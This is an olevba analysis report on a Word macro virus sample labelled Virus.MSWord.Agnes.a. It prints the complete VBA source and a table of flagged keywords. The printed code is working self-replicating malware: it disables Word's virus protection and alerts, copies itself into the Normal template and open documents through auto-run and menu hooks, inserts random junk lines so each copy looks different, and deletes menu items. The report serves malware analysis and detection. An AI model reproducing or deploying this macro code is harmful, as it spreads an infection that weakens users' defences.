olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Agnes.a-740f9bd4919cd9e824826e8052ddf10ff8752fa5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Agnes.a-740f9bd4919cd9e824826e8052ddf10ff8752fa5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO AL.bas 
in file: Virus.MSWord.Agnes.a-740f9bd4919cd9e824826e8052ddf10ff8752fa5 - OLE stream: 'Macros/VBA/AL'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub RuLeQp9075()
On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Randomize
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("AL").CodeModule.CountOfLines
If ActiveLines > 300 Then
With Application.VBE.ActiveVBProject.VBComponents("AL").CodeModule
For TheLine = 1 To .CountOfLines
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Next TheLine
End With
Else
With Application.VBE.ActiveVBProject.VBComponents("AL").CodeModule
PolySize = Int(Rnd * 10)
For PolyMorphic = 1 To PolySize
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Next PolyMorphic
End With
End If
If Day(Now()) = 10 Then
Application.Caption = "AGNES LEE"
End If
Application.CommandBars("View").Controls(6).Delete
Application.CommandBars("Format").Controls(12).Delete
Application.CommandBars("Tools").Controls(12).Delete
Application.CommandBars("Tools").Controls(13).Delete
End Sub
Sub Tl569()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
With Options
.SaveNormalPrompt = False
.VirusProtection = False
.ConfirmConversions = False
End With
Application.VBE.ActiveVBProject.VBComponents("AL").Export "C:\AL.sys"
With Dialogs(wdDialogFileSummaryInfo)
.Author = Chr(74) + Chr(97) + Chr(99) + Chr(107) + Chr(32) + Chr(84) + Chr(119) + Chr(111) + Chr(102) + Chr(108) + Chr(111) + Chr(119) + Chr(101) + Chr(114) + Chr(32) + Chr(45) + Chr(61) + Chr(91) + Chr(76) + Chr(105) + Chr(110) + Chr(101) + Chr(90) + Chr(101) + Chr(114) + Chr(216) + Chr(32) + Chr(86) + Chr(120) + Chr(32) + Chr(84) + Chr(101) + Chr(97) + Chr(109) + Chr(93) + Chr(61) + Chr(45)
.Comments = "WM97.AL" & Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(76) + Chr(105) + Chr(77) + Chr(69) + Chr(32) + Chr(49) + Chr(46) + Chr(111)
.Keywords = "LiME ID: 18288-Tl-5699075-Lm.W"
.Execute
End With
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(x).Name = "AL" Then RfEfVg8187VhPkUu569 = True
Next x
For y = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(y).Name = "AL" Then VlCjMk457RuLeQp9075 = True
Next y
If RfEfVg8187VhPkUu569 = True And VlCjMk457RuLeQp9075 = False Then Set TkErNq244PwQuUk36 = ActiveDocument.VBProject
If RfEfVg8187VhPkUu569 = False And VlCjMk457RuLeQp9075 = True Then Set TkErNq244PwQuUk36 = NormalTemplate.VBProject
If RfEfVg8187VhPkUu569 = True And VlCjMk457RuLeQp9075 = True Then GoTo Ende_
TkErNq244PwQuUk36.VBComponents.Import "C:\AL.sys"
If VlCjMk457RuLeQp9075 = False Then ActiveDocument.SaveAs (WordBasic.[FileName$]()), FileFormat:=wdFormatDocument
If RfEfVg8187VhPkUu569 = False Then NormalTemplate.Save
Ende_:
Call RuLeQp9075
End Sub
Sub AutoOpen()
On Error Resume Next
Call Tl569
Call RuLeQp9075
End Sub
Sub AutoExit()
On Error Resume Next
Call Tl569
Call RuLeQp9075
End Sub
Sub AutoNew()
On Error Resume Next
Call Tl569
Call RuLeQp9075
End Sub
Sub AutoExec()
On Error Resume Next
Call Tl569
Call RuLeQp9075
End Sub
Sub DateiNeu()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
Call Tl569
Call RuLeQp9075
End Sub
Sub DateiOffnen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Call Tl569
Call RuLeQp9075
End Sub
Sub DateiSchliesen()
On Error Resume Next
Call Tl569
Call RuLeQp9075
WordBasic.FileClose dlg
End Sub
Sub DateiSpeichern()
On Error Resume Next
Call Tl569
Call RuLeQp9075
ActiveDocument.Save
End Sub
Sub DateiDrucken()
On Error Resume Next
Call Tl569
Call RuLeQp9075
Dialogs(wdDialogFilePrint).Show
End Sub
Sub BearbeitenErsetzen()
On Error Resume Next
Call Tl569
Call RuLeQp9075
Dialogs(wdDialogEditReplace).Show
End Sub
Sub ExtrasRechtschreibung()
On Error Resume Next
Call Tl569
Call RuLeQp9075
If Options.CheckGrammarWithSpelling = True Then
ActiveDocument.CheckGrammar
Else
ActiveDocument.CheckSpelling
End If
End Sub
Sub ExtrasSilbentrennung()
On Error Resume Next
Call Tl569
Call RuLeQp9075
Dialogs(wdDialogsToolsHyphenation).Show
End Sub
Sub ExtrasOptionen()
On Error Resume Next
Call Tl569
Call RuLeQp9075
Dialogs(wdDialogToolsOptions).Show
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

